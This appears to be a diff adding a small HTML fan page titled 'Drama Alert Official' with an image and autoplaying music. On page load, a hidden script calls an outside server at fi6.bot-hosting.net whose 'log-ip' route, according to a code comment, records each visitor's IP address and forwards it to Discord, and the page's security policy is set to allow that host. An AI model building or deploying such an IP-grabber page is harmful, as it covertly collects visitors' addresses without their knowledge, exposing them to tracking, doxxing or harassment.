@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drama Alert Official</title>
+    <meta http-equiv="Content-Security-Policy" content="connect-src 'self' http://fi6.bot-hosting.net:21070;">
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            color: #ff0000;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+        audio {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Drama Alert Official</h1>
+    <img src="keem.png" alt="Drama Alert">
+    <audio controls autoplay>
+        <source src="music.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        window.onload = function() {
+            // Fetch the log-ip route to log the IP and send to Discord
+            fetch('http://fi6.bot-hosting.net:21070/log-ip')
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error logging IP:', error));
+        };
+    </script>
+</body>
+</html>
